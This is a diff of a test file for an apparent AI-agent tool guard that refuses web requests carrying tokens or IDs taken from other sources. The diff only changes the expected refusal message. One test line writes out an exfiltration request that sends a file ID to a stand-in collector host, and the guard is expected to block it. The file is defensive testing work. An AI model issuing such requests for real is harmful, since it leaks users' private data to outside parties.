@@ -85,7 +85,7 @@ describe("one provenance rule across sources and scans", () => {
   });
 
   it("applies to every site destination a row declares, not just the browser", () => {
-    expect(call("http_request", { url: API, method: "GET" })?.reason).toMatch(/High-Entropy Token/);
+    expect(call("http_request", { url: API, method: "GET" })?.reason).toMatch(/random-looking text/);
     expect(call("web_fetch", { url: DOC })?.reason).toMatch(/High-Entropy Token/);
     expect(call("extract_site_assets", { url: DOC })?.reason).toMatch(/High-Entropy Token/);
     recordSiteTokens(SESSION, "https://console.twilio.com/home", `Account SID ${SID}`);
@@ -115,10 +115,10 @@ describe("an id an API response returned may go back to that API", () => {
 
   it("is refused before the response, allowed after it, and still refused anywhere else", async () => {
     const { applyResultTaintPolicy } = await import("../tool-execution/sensitive-read-taint.js");
-    expect(call("http_request", { url: GET, method: "GET" })?.reason).toMatch(/High-Entropy Token/);
+    expect(call("http_request", { url: GET, method: "GET" })?.reason).toMatch(/random-looking text/);
     applyResultTaintPolicy("http_request", { url: LIST, method: "GET" }, SESSION,
       { content: JSON.stringify({ files: [{ id: FILE_ID, name: "Q3 plan" }] }) }, { id: "floor-test", pairs: [], preTaintedPath: null, unborn: [], unbornWrites: [] });
     expect(call("http_request", { url: GET, method: "GET" })).toBeNull();
-    expect(call("http_request", { url: `https://collector.example/?f=${FILE_ID}`, method: "GET" })?.reason).toMatch(/High-Entropy Token/);
+    expect(call("http_request", { url: `https://collector.example/?f=${FILE_ID}`, method: "GET" })?.reason).toMatch(/random-looking text/);
   });
 });
